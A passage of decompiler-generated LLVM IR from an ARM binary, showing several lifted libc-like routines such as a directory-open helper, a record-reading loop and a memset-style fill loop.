  %v0_139dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_139dc, i32* %r2.global-to-local, align 4
  %v2_139e0 = inttoptr i32 %v0_139d4 to i32*
  store i32 9, i32* %v2_139e0, align 4
  %v0_13a40.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a40

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139a8
  %v8_139f0 = call i32 @function_14c9c(i32 %v2_139b4, i32 ptrtoint (i32* @global_var_14c94.595 to i32), i32 %v1_139b8, i32 85148, i32 %v3_139a8, i32 %v6_139a8, i32 %v9_139a8)
  %v1_13a00 = call i32 @function_14c94()
  %v0_13a0c = load i32, i32* @r5, align 4
  %v1_13a0c = inttoptr i32 %v0_13a0c to i32*
  %v2_13a0c = load i32, i32* %v1_13a0c, align 4
  store i32 %v2_13a0c, i32* @r4, align 4
  store i32 %v2_139b4, i32* @r0, align 4
  store i32 -1, i32* %v1_13a0c, align 4
  store i32 ptrtoint (i32* @global_var_13a24.599 to i32), i32* @lr, align 4
  %v8_13a20 = call i32 @function_14c9c(i32 %v2_139b4, i32 1, i32 %v1_139b8, i32 85148, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_13a24 = load i32, i32* @r5, align 4
  %v1_13a24 = add i32 %v0_13a24, 12
  %v2_13a24 = inttoptr i32 %v1_13a24 to i32*
  %v3_13a24 = load i32, i32* %v2_13a24, align 4
  store i32 %v3_13a24, i32* @r0, align 4
  %v0_13a28 = call i32 @function_142ac()
  %v0_13a2c = load i32, i32* @r5, align 4
  store i32 %v0_13a2c, i32* @r0, align 4
  %v0_13a30 = call i32 @function_142ac()
  %v0_13a34 = load i32, i32* @r4, align 4
  %v1_13a38 = call i32 @function_13654(i32 %v0_13a34)
  store i32 %v1_13a38, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a40

dec_label_pc_13a40:                               ; preds = %dec_label_pc_139d4, %dec_label_pc_139e8
  %v0_13a40 = phi i32 [ %v0_13a40.pre, %dec_label_pc_139d4 ], [ %v1_13a38, %dec_label_pc_139e8 ]
  %v2_13a48 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13a48, i32* @r4, align 4
  store i32 %v6_139a8, i32* @r5, align 4
  store i32 %v9_139a8, i32* @r6, align 4
  store i32 %v12_139a8, i32* @r7, align 4
  ret i32 %v0_13a40

; uselistorder directives
  uselistorder i32 %v1_139b8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_139b4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_139a8, { 1, 0 }
  uselistorder i32 %v6_139a8, { 1, 0 }
  uselistorder label %dec_label_pc_13a40, { 1, 0 }
}

define i32 @function_13a5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13a5c:
  %r5.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-108 = alloca i32, align 4
  %v3_13a5c = load i32, i32* @r4, align 4
  %v9_13a5c = load i32, i32* @r6, align 4
  %v12_13a5c = load i32, i32* @r7, align 4
  %v0_13a68 = load i32, i32* @r0, align 4
  %v2_13a68 = inttoptr i32 %v0_13a68 to i8*
  %v3_13a68 = call i32 @function_13780(i8* %v2_13a68, i32 18432)
  store i32 %v3_13a68, i32* @r0, align 4
  store i32 %v3_13a68, i32* @r7, align 4
  %v1_13a6c = icmp slt i32 %v3_13a68, 0
  br i1 %v1_13a6c, label %.thread1, label %dec_label_pc_13a78

.thread1:                                         ; preds = %dec_label_pc_13a5c
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_13b48

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a5c
  %v2_13a64 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_13a64, i32* @r1, align 4
  %v0_13a7c = call i32 @function_150c0()
  %v1_13a80 = icmp slt i32 %v0_13a7c, 0
  br i1 %v1_13a80, label %dec_label_pc_13aa0, label %dec_label_pc_13a88

dec_label_pc_13a88:                               ; preds = %dec_label_pc_13a78
  %v0_13a88 = load i32, i32* @r7, align 4
  store i32 1, i32* @r2, align 4
  %v2_13a94 = call i32 @function_13564(i32 %v0_13a88, i32 2)
  %v1_13a98 = icmp slt i32 %v2_13a94, 0
  br i1 %v1_13a98, label %dec_label_pc_13aa0, label %dec_label_pc_13ac0

dec_label_pc_13aa0:                               ; preds = %dec_label_pc_13a88, %dec_label_pc_13a78
  %v0_13aa0 = call i32 @function_13c28()
  store i32 %v0_13aa0, i32* %r5.global-to-local, align 4
  %v0_13aa8 = load i32, i32* @r7, align 4
  %v1_13aac = inttoptr i32 %v0_13aa0 to i32*
  %v2_13aac = load i32, i32* %v1_13aac, align 4
  store i32 %v2_13aac, i32* @r4, align 4
  %v1_13ab0 = call i32 @function_13654(i32 %v0_13aa8)
  store i32 0, i32* @r6, align 4
  %v0_13ab8 = load i32, i32* @r4, align 4
  %v1_13ab8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ab8 = inttoptr i32 %v1_13ab8 to i32*
  store i32 %v0_13ab8, i32* %v2_13ab8, align 4
  br label %dec_label_pc_13b48

dec_label_pc_13ac0:                               ; preds = %dec_label_pc_13a88
  %v1_13ac4 = call i32 @function_14100(i32 48)
  store i32 %v1_13ac4, i32* @r6, align 4
  %v2_13ac8 = icmp eq i32 %v1_13ac4, 0
  br i1 %v2_13ac8, label %dec_label_pc_13b18, label %dec_label_pc_13ad0

dec_label_pc_13ad0:                               ; preds = %dec_label_pc_13ac0
  store i32 0, i32* @r4, align 4
  %v2_13ad4 = add i32 %v1_13ac4, 16
  %v3_13ad4 = inttoptr i32 %v2_13ad4 to i32*
  store i32 0, i32* %v3_13ad4, align 4
  %v2_13adc = icmp ugt i32 %tmp, 511
  %v1_13ae0 = load i32, i32* @r6, align 4
  %v2_13ae0 = add i32 %v1_13ae0, 20
  %v3_13ae0 = inttoptr i32 %v2_13ae0 to i32*
  store i32 %tmp, i32* %v3_13ae0, align 4
  br i1 %v2_13adc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13ad0
  %v2_13ae8 = load i32, i32* @r6, align 4
  %v3_13ae8 = add i32 %v2_13ae8, 20
  %v4_13ae8 = inttoptr i32 %v3_13ae8 to i32*
  store i32 512, i32* %v4_13ae8, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13ad0, %bb
  %v0_13aec = load i32, i32* @r7, align 4
  %v1_13aec = load i32, i32* @r6, align 4
  %v2_13aec = inttoptr i32 %v1_13aec to i32*
  store i32 %v0_13aec, i32* %v2_13aec, align 4
  %v0_13af0 = load i32, i32* @r4, align 4
  %v1_13af0 = load i32, i32* @r6, align 4
  %v2_13af0 = add i32 %v1_13af0, 8
  %v3_13af0 = inttoptr i32 %v2_13af0 to i32*
  store i32 %v0_13af0, i32* %v3_13af0, align 4
  %v0_13af4 = load i32, i32* @r4, align 4
  %v1_13af4 = load i32, i32* @r6, align 4
  %v2_13af4 = add i32 %v1_13af4, 4
  %v3_13af4 = inttoptr i32 %v2_13af4 to i32*
  store i32 %v0_13af4, i32* %v3_13af4, align 4
  %v0_13afc = load i32, i32* @r6, align 4
  %v1_13afc = add i32 %v0_13afc, 20
  %v2_13afc = inttoptr i32 %v1_13afc to i32*
  %v3_13afc = load i32, i32* %v2_13afc, align 4
  %v2_13b00 = call i32 @function_14254(i32 1, i32 %v3_13afc)
  %v2_13b04 = icmp eq i32 %v2_13b00, 0
  %v1_13b08 = load i32, i32* @r6, align 4
  %v2_13b08 = add i32 %v1_13b08, 12
  %v3_13b08 = inttoptr i32 %v2_13b08 to i32*
  store i32 %v2_13b00, i32* %v3_13b08, align 4
  br i1 %v2_13b04, label %dec_label_pc_13b10, label %dec_label_pc_13b34

dec_label_pc_13b10:                               ; preds = %.thread
  %v0_13b10 = load i32, i32* @r6, align 4
  store i32 %v0_13b10, i32* @r0, align 4
  %v0_13b14 = call i32 @function_142ac()
  br label %dec_label_pc_13b18

dec_label_pc_13b18:                               ; preds = %dec_label_pc_13ac0, %dec_label_pc_13b10
  %v0_13b18 = load i32, i32* @r7, align 4
  %v1_13b1c = call i32 @function_13654(i32 %v0_13b18)
  %v0_13b20 = call i32 @function_13c28()
  store i32 0, i32* @r6, align 4
  %v2_13b2c = inttoptr i32 %v0_13b20 to i32*
  store i32 12, i32* %v2_13b2c, align 4
  br label %dec_label_pc_13b48

dec_label_pc_13b34:                               ; preds = %.thread
  store i32 80712, i32* @lr, align 4
  %v1_13b44 = call i32 @function_14c94()
  br label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %.thread1, %dec_label_pc_13b18, %dec_label_pc_13aa0, %dec_label_pc_13b34
  %v0_13b48 = load i32, i32* @r6, align 4
  store i32 %v3_13a5c, i32* @r4, align 4
  store i32 %v9_13a5c, i32* @r6, align 4
  store i32 %v12_13a5c, i32* @r7, align 4
  ret i32 %v0_13b48

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_14254, { 35, 6, 36, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 1, 22, 21, 20, 19, 18, 2, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 4, 3, 0 }
  uselistorder i32 512, { 0, 5, 1, 2, 8, 6, 7, 9, 3, 10, 4, 11 }
  uselistorder i32 (i32)* @function_13654, { 26, 25, 24, 10, 41, 40, 9, 8, 39, 38, 7, 6, 32, 11, 37, 36, 35, 34, 33, 31, 30, 29, 28, 27, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13b48, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_13b18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13b58(i32* %arg1) local_unnamed_addr {
dec_label_pc_13b58:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_13b58 = load i32, i32* @r4, align 4
  %v6_13b58 = load i32, i32* @r5, align 4
  %v9_13b58 = load i32, i32* @lr, align 4
  %v1_13b5c = add i32 %tmp, 24
  store i32 %v1_13b5c, i32* @r4, align 4
  %v2_13b60 = ptrtoint i32* %stack_var_-28 to i32
  store i32 85148, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v2_13b60, i32* @r0, align 4
  store i32 %v1_13b5c, i32* %r2.global-to-local, align 4
  %v8_13b7c = call i32 @function_14c9c(i32 %v2_13b60, i32 ptrtoint (i32* @global_var_14c94.595 to i32), i32 %v1_13b5c, i32 85148, i32 %v3_13b58, i32 %v6_13b58, i32 %v9_13b58)
  %v0_13b80 = load i32, i32* @r4, align 4
  store i32 %v0_13b80, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14c94.595 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_13b90.604 to i32), i32* @lr, align 4
  %v1_13b8c = call i32 @function_14c94()
  store i32 %v1_13b8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b90:                               ; preds = %dec_label_pc_13bc4, %dec_label_pc_13b58
  %v0_13b90 = load i32, i32* @r5, align 4
  %v1_13b90 = add i32 %v0_13b90, 4
  %v2_13b90 = inttoptr i32 %v1_13b90 to i32*
  %v3_13b90 = load i32, i32* %v2_13b90, align 4
  store i32 %v3_13b90, i32* %r2.global-to-local, align 4
  %v4_13b90 = add i32 %v0_13b90, 8
  %v5_13b90 = inttoptr i32 %v4_13b90 to i32*
  %v6_13b90 = load i32, i32* %v5_13b90, align 4
  store i32 %v6_13b90, i32* %r3.global-to-local, align 4
  %tmp8 = icmp ugt i32 %v6_13b90, %v3_13b90
  br i1 %tmp8, label %dec_label_pc_13bc4, label %dec_label_pc_13b9c

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b90
  %v1_13b9c = inttoptr i32 %v0_13b90 to i32*
  %v2_13b9c = load i32, i32* %v1_13b9c, align 4
  store i32 %v2_13b9c, i32* @r0, align 4
  %v1_13ba0 = add i32 %v0_13b90, 12
  %v2_13ba0 = inttoptr i32 %v1_13ba0 to i32*
  %v3_13ba0 = load i32, i32* %v2_13ba0, align 4
  %v1_13ba4 = add i32 %v0_13b90, 20
  %v2_13ba4 = inttoptr i32 %v1_13ba4 to i32*
  %v3_13ba4 = load i32, i32* %v2_13ba4, align 4
  store i32 %v3_13ba4, i32* @r2, align 4
  %v4_13ba8 = call i32 @function_15110(i32 %v2_13b9c, i32 %v3_13ba0, i32 %v3_13ba4, i32 %v6_13b90)
  store i32 %v4_13ba8, i32* %r0.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_13ba8, 1
  br i1 %tmp7, label %.thread, label %dec_label_pc_13bb8

.thread:                                          ; preds = %dec_label_pc_13b9c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13bf8

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13b9c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13bbc = load i32, i32* @r5, align 4
  %v2_13bbc = add i32 %v1_13bbc, 4
  %v3_13bbc = inttoptr i32 %v2_13bbc to i32*
  store i32 0, i32* %v3_13bbc, align 4
  %v1_13bc0 = load i32, i32* @r5, align 4
  %v2_13bc0 = add i32 %v1_13bc0, 8
  %v3_13bc0 = inttoptr i32 %v2_13bc0 to i32*
  store i32 %v4_13ba8, i32* %v3_13bc0, align 4
  %v0_13bc4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13bc4

dec_label_pc_13bc4:                               ; preds = %dec_label_pc_13b90, %dec_label_pc_13bb8
  %v1_13bdc = phi i32 [ %v0_13b90, %dec_label_pc_13b90 ], [ %v0_13bc4.pre, %dec_label_pc_13bb8 ]
  %v1_13bc4 = add i32 %v1_13bdc, 4
  %v2_13bc4 = inttoptr i32 %v1_13bc4 to i32*
  %v3_13bc4 = load i32, i32* %v2_13bc4, align 4
  store i32 %v3_13bc4, i32* %r2.global-to-local, align 4
  %v1_13bc8 = add i32 %v1_13bdc, 12
  %v2_13bc8 = inttoptr i32 %v1_13bc8 to i32*
  %v3_13bc8 = load i32, i32* %v2_13bc8, align 4
  store i32 %v3_13bc8, i32* %ip.global-to-local, align 4
  %v2_13bcc = add i32 %v3_13bc8, %v3_13bc4
  store i32 %v2_13bcc, i32* @r4, align 4
  %v1_13bd0 = add i32 %v2_13bcc, 4
  %v2_13bd0 = inttoptr i32 %v1_13bd0 to i32*
  %v3_13bd0 = load i32, i32* %v2_13bd0, align 4
  %v1_13bd4 = add i32 %v2_13bcc, 8
  %v2_13bd4 = inttoptr i32 %v1_13bd4 to i8*
  %v3_13bd4 = load i8, i8* %v2_13bd4, align 1
  %v4_13bd4 = zext i8 %v3_13bd4 to i32
  store i32 %v4_13bd4, i32* %r3.global-to-local, align 4
  %v1_13bd8 = add i32 %v2_13bcc, 9
  %v2_13bd8 = inttoptr i32 %v1_13bd8 to i8*
  %v3_13bd8 = load i8, i8* %v2_13bd8, align 1
  %v4_13bd8 = zext i8 %v3_13bd8 to i32
  store i32 %v4_13bd8, i32* %r0.global-to-local, align 4
  %v2_13bdc = add i32 %v1_13bdc, 16
  %v3_13bdc = inttoptr i32 %v2_13bdc to i32*
  store i32 %v3_13bd0, i32* %v3_13bdc, align 4
  %v0_13be0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13be0 = load i32, i32* %ip.global-to-local, align 4
  %v2_13be0 = add i32 %v1_13be0, %v0_13be0
  %v3_13be0 = inttoptr i32 %v2_13be0 to i32*
  %v4_13be0 = load i32, i32* %v3_13be0, align 4
  %v0_13be4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13be4 = load i32, i32* %r0.global-to-local, align 4
  %v4_13be4 = mul i32 %v1_13be4, 256
  %v5_13be4 = or i32 %v4_13be4, %v0_13be4
  store i32 %v5_13be4, i32* %r3.global-to-local, align 4
  %v2_13be8 = add i32 %v5_13be4, %v0_13be0
  store i32 %v2_13be8, i32* @r2, align 4
  %v2_13bec = icmp eq i32 %v4_13be0, 0
  %v1_13bf0 = load i32, i32* @r5, align 4
  %v2_13bf0 = add i32 %v1_13bf0, 4
  %v3_13bf0 = inttoptr i32 %v2_13bf0 to i32*
  store i32 %v2_13be8, i32* %v3_13bf0, align 4
  br i1 %v2_13bec, label %dec_label_pc_13b90, label %dec_label_pc_13bf8

dec_label_pc_13bf8:                               ; preds = %dec_label_pc_13bc4, %.thread
  store i32 %v2_13b60, i32* @r0, align 4
  store i32 85148, i32* %r3.global-to-local, align 4
  store i32 80908, i32* @lr, align 4
  %v3_13c08 = load i32, i32* @r2, align 4
  %v8_13c08 = call i32 @function_14c9c(i32 %v2_13b60, i32 1, i32 %v3_13c08, i32 85148, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_13c0c = load i32, i32* @r4, align 4
  store i32 %v0_13c0c, i32* %r0.global-to-local, align 4
  store i32 %v3_13b58, i32* @r4, align 4
  store i32 %v6_13b58, i32* @r5, align 4
  ret i32 %v0_13c0c

; uselistorder directives
  uselistorder i32 %v1_13bdc, { 0, 2, 1 }
  uselistorder i32 %v6_13b90, { 1, 0, 2 }
  uselistorder i32 %v0_13b90, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_13b60, { 1, 0, 3, 2 }
  uselistorder i32 %v1_13b5c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 6, 1, 5, 0 }
  uselistorder label %dec_label_pc_13bc4, { 1, 0 }
}

define i32 @function_13c28() local_unnamed_addr {
dec_label_pc_13c28:
  ret i32 ptrtoint (i32* @global_var_1ec70.607 to i32)
}

define i32 @function_13c34(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c34:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v1_13c40 = bitcast i32* %stack_var_-20 to %tms*
  %v2_13c40 = call i32 @function_154a0(%tms* %v1_13c40)
  %v2_13c48 = load i32, i32* %stack_var_-20, align 4
  %v2_13c4c = add i32 %v2_13c48, %tmp
  %v2_13c54 = mul i32 %v2_13c4c, 10000
  %v1_13c58 = and i32 %v2_13c54, 2147483632
  ret i32 %v1_13c58

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_13c64(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c64:
  %v0_13c64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c64, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_13c64
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_13c64, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_13c70(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13c70:
  %v0_13c70 = call i32 @function_158b0()
  ret i32 %v0_13c70
}

define i32 @function_13c80(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13c80:
  %v0_13c80 = call i32 @function_158b0()
  ret i32 %v0_13c80

; uselistorder directives
  uselistorder i32 ()* @function_158b0, { 1, 0 }
}

define i32 @function_13c90(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c90:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_13c94 = load i32, i32* @r2, align 4
  %v8_13c94 = icmp eq i32 %v0_13c94, 8
  store i1 %v8_13c94, i1* %cpsr_z.global-to-local, align 1
  %v5_13c98 = icmp slt i32 %v0_13c94, 8
  br i1 %v5_13c98, label %dec_label_pc_13cf8, label %dec_label_pc_13c9c

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13c90
  %v4_13c9c = mul i32 %arg2, 256
  %v5_13c9c = or i32 %v4_13c9c, %arg2
  %v4_13ca0 = mul i32 %v5_13c9c, 65536
  %v5_13ca0 = or i32 %v4_13ca0, %v5_13c9c
  store i32 %v5_13ca0, i32* %r1.global-to-local, align 4
  %v1_13ca457 = urem i32 %tmp, 4
  %v2_13ca458 = icmp eq i32 %v1_13ca457, 0
  store i1 %v2_13ca458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_13ca458, label %dec_label_pc_13cb4, label %bb

bb:                                               ; preds = %dec_label_pc_13c9c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_13c9c ]
  %v3_13ca859 = phi i32 [ %v6_13ca8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_13c9c ]
  %v4_13ca8 = inttoptr i32 %v3_13ca859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_13ca8, align 1
  %v5_13ca8 = load i32, i32* %r3.global-to-local, align 4
  %v6_13ca8 = add i32 %v5_13ca8, 1
  store i32 %v6_13ca8, i32* %r3.global-to-local, align 4
  %v0_13cac.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13cb8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_13cac.pr, label %dec_label_pc_13cb4, label %.thread

.thread:                                          ; preds = %bb
  %v2_13cac = add i32 %v0_13cb8.pr.pre, -1
  store i32 %v2_13cac, i32* @r2, align 4
  %v1_13ca4 = urem i32 %v6_13ca8, 4
  %v2_13ca4 = icmp eq i32 %v1_13ca4, 0
  store i1 %v2_13ca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ca4, label %dec_label_pc_13cb4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_13ca8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_13ca8.pre to i8
  br label %bb

dec_label_pc_13cb4:                               ; preds = %.thread, %bb, %dec_label_pc_13c9c
  %v0_13cc028 = phi i32 [ %tmp, %dec_label_pc_13c9c ], [ %v6_13ca8, %bb ], [ %v6_13ca8, %.thread ]
  %v0_13cb8.pr = phi i32 [ %v0_13c94, %dec_label_pc_13c9c ], [ %v0_13cb8.pr.pre, %bb ], [ %v2_13cac, %.thread ]
  %v0_13cb4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13cb4, i32* %ip.global-to-local, align 4
  %v8_13cb810 = icmp eq i32 %v0_13cb8.pr, 8
  store i1 %v8_13cb810, i1* %cpsr_z.global-to-local, align 1
  %v5_13cbc11 = icmp slt i32 %v0_13cb8.pr, 8
  br i1 %v5_13cbc11, label %dec_label_pc_13cf8, label %dec_label_pc_13cc0.preheader

dec_label_pc_13cc0.preheader:                     ; preds = %dec_label_pc_13cb4
  %v1_13cc046 = inttoptr i32 %v0_13cc028 to i32*
  store i32 %v0_13cb4, i32* %v1_13cc046, align 4
  %v3_13cc047 = add i32 %v0_13cc028, 4
  %v4_13cc048 = inttoptr i32 %v3_13cc047 to i32*
  %v5_13cc049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13cc049, i32* %v4_13cc048, align 4
  %v6_13cc050 = add i32 %v0_13cc028, 8
  store i32 %v6_13cc050, i32* %r3.global-to-local, align 4
  %v0_13cc451 = load i32, i32* @r2, align 4
  %v1_13cc452 = add i32 %v0_13cc451, -8
  store i32 %v1_13cc452, i32* %r2.global-to-local, align 4
  %v5_13ccc53 = icmp slt i32 %v1_13cc452, 8
  br i1 %v5_13ccc53, label %dec_label_pc_13cc0.dec_label_pc_13cf8.loopexit_crit_edge, label %dec_label_pc_13cd0

dec_label_pc_13cd0:                               ; preds = %dec_label_pc_13cc0.preheader, %dec_label_pc_13cb8.dec_label_pc_13cc0_crit_edge
  %v6_13cc055 = phi i32 [ %v6_13cc0, %dec_label_pc_13cb8.dec_label_pc_13cc0_crit_edge ], [ %v6_13cc050, %dec_label_pc_13cc0.preheader ]
  %v0_13cc054 = phi i32 [ %v12_13cec, %dec_label_pc_13cb8.dec_label_pc_13cc0_crit_edge ], [ %v0_13cc028, %dec_label_pc_13cc0.preheader ]
  %v1_13cd0 = inttoptr i32 %v6_13cc055 to i32*
  %v2_13cd0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13cd0, i32* %v1_13cd0, align 4
  %v3_13cd0 = add i32 %v0_13cc054, 12
  %v4_13cd0 = inttoptr i32 %v3_13cd0 to i32*
  %v5_13cd0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13cd0, i32* %v4_13cd0, align 4
  %v6_13cd0 = add i32 %v0_13cc054, 16
  store i32 %v6_13cd0, i32* %r3.global-to-local, align 4
  %v0_13cd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13cd4 = add i32 %v0_13cd4, -8
  store i32 %v1_13cd4, i32* %r2.global-to-local, align 4
  %v5_13cdc = icmp slt i32 %v1_13cd4, 8
  br i1 %v5_13cdc, label %dec_label_pc_13cd0.dec_label_pc_13cf8.loopexit_crit_edge, label %dec_label_pc_13ce0

dec_label_pc_13ce0:                               ; preds = %dec_label_pc_13cd0
  %v1_13ce0 = inttoptr i32 %v6_13cd0 to i32*
  %v2_13ce0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13ce0, i32* %v1_13ce0, align 4
  %v3_13ce0 = add i32 %v0_13cc054, 20
  %v4_13ce0 = inttoptr i32 %v3_13ce0 to i32*
  %v5_13ce0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13ce0, i32* %v4_13ce0, align 4
  %v6_13ce0 = add i32 %v0_13cc054, 24
  store i32 %v6_13ce0, i32* %r3.global-to-local, align 4
  %v0_13ce4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ce4 = add i32 %v0_13ce4, -8
  store i32 %v1_13ce4, i32* %r2.global-to-local, align 4
  %v5_13cec = icmp slt i32 %v1_13ce4, 8
  br i1 %v5_13cec, label %dec_label_pc_13ce0.dec_label_pc_13cf8.loopexit_crit_edge, label %dec_label_pc_13cb8

dec_label_pc_13cb8:                               ; preds = %dec_label_pc_13ce0
  %v7_13cec = inttoptr i32 %v6_13ce0 to i32*
  %v8_13cec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_13cec, i32* %v7_13cec, align 4
  %v9_13cec = add i32 %v0_13cc054, 28
  %v10_13cec = inttoptr i32 %v9_13cec to i32*
  %v11_13cec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_13cec, i32* %v10_13cec, align 4
  %v12_13cec = add i32 %v0_13cc054, 32
  store i32 %v12_13cec, i32* %r3.global-to-local, align 4
  %v6_13cf0 = load i32, i32* %r2.global-to-local, align 4
  %v7_13cf0 = add i32 %v6_13cf0, -8
  store i32 %v7_13cf0, i32* %r2.global-to-local, align 4
  %v5_13cbc = icmp slt i32 %v7_13cf0, 8
  br i1 %v5_13cbc, label %dec_label_pc_13cb8.dec_label_pc_13cf8.loopexit_crit_edge, label %dec_label_pc_13cb8.dec_label_pc_13cc0_crit_edge

dec_label_pc_13cb8.dec_label_pc_13cc0_crit_edge:  ; preds = %dec_label_pc_13cb8
  %v2_13cc0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13cc0 = inttoptr i32 %v12_13cec to i32*
  store i32 %v2_13cc0.pre, i32* %v1_13cc0, align 4
  %v3_13cc0 = add i32 %v0_13cc054, 36
  %v4_13cc0 = inttoptr i32 %v3_13cc0 to i32*
  %v5_13cc0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13cc0, i32* %v4_13cc0, align 4
  %v6_13cc0 = add i32 %v0_13cc054, 40
  store i32 %v6_13cc0, i32* %r3.global-to-local, align 4
  %v0_13cc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13cc4 = add i32 %v0_13cc4, -8
  store i32 %v1_13cc4, i32* %r2.global-to-local, align 4
  %v5_13ccc = icmp slt i32 %v1_13cc4, 8
  br i1 %v5_13ccc, label %dec_label_pc_13cc0.dec_label_pc_13cf8.loopexit_crit_edge, label %dec_label_pc_13cd0

dec_label_pc_13cc0.dec_label_pc_13cf8.loopexit_crit_edge: ; preds = %dec_label_pc_13cb8.dec_label_pc_13cc0_crit_edge, %dec_label_pc_13cc0.preheader
  %v1_13cc4.lcssa = phi i32 [ %v1_13cc452, %dec_label_pc_13cc0.preheader ], [ %v1_13cc4, %dec_label_pc_13cb8.dec_label_pc_13cc0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13cf8

dec_label_pc_13cb8.dec_label_pc_13cf8.loopexit_crit_edge: ; preds = %dec_label_pc_13cb8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13cf8

dec_label_pc_13cd0.dec_label_pc_13cf8.loopexit_crit_edge: ; preds = %dec_label_pc_13cd0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13cf8

dec_label_pc_13ce0.dec_label_pc_13cf8.loopexit_crit_edge: ; preds = %dec_label_pc_13ce0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13cf8

